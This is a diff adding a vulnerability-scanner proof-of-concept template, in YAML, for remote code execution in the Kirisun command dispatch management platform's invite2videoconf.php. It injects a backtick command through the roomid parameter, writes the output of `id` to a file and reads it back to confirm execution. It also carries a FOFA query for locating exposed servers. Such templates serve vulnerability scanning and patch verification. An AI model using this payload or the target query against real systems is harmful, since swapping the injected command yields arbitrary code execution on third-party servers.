@@ -1,0 +1,19 @@
+id: poc-yaml-kirisun-command-scheduling-management-platform-invite2videoconf-php-rce
+info:
+  name: 科立讯指挥调度管理平台 invite2videoconf.php 远程代码执行漏洞
+  severity: critical
+  tags:
+  - rce
+  finger: 科立讯指挥调度管理平台
+  fofa: body="指挥调度管理平台"
+variables:
+  t1: random_str(6)
+requests:
+- method: GET
+  path: /api/client/invite2videoconf.php?callee=1&roomid=`id>{{.t1}}.txt`
+  expression: status_code == 200 && contains(body,"success")
+- method: GET
+  path: /api/client/{{.t1}}.txt
+  expression: status_code == 200 && contains(body,"uid=") && contains(body,"gid=")
+    && !contains(body,"<")
+transport: http
